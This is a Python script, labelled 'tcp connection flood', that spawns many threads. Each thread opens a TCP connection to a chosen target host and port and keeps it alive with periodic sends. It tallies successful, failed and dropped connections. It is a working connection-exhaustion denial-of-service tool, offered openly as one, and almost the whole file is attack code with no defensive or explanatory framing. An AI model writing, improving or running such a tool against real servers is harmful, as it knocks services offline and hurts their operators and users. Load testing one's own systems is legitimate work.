
#-------------------------------- tcp connection flood

import threading
import sys
import socket  
from time import sleep
import random
 
class ThreadMaker:

    def lunch(self, functionObj, arguments, thread_count):
        fn = functionObj
        for i in range(0, thread_count):
            try:
                t = threading.Thread(target=fn, args=(arguments, i))
                t.start()
            except:
                print("can not create new thread.")
            sleep(1)



class ConnectionFlood:

    def __init__(self):
        self.connection_success_count = 0
        self.connection_failed_count = 0
        self.connection_dropped_count = 0
    

    def create_emptyConnection(self, arguments_dict, threadID):

        port = arguments_dict['port']
        target= arguments_dict['target']
        timeinterval = arguments_dict['timeinterval']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.settimeout(3)
            s.connect((target, port))
            self.connection_success_count += 1
            #print(" worker num: ___#"+str(threadID)+"  started \n")
        except:
            self.connection_failed_count += 1
            return


        #while True:
        #    sleep(5)

        count = 0
        while True:
            sleep(timeinterval)
            try:
                s.settimeout(3)
                s.send(bytes("to check if the it is dorpped or not.  "+str(count)+"\n", 'utf-8'))
                #print("this payload is sent acros the connection to check if the it is dorpped or not.")
            except:
                self.connection_dropped_count += 1
                #print("\n----------------------- connection is dorpped")
                return
            count += 1
                
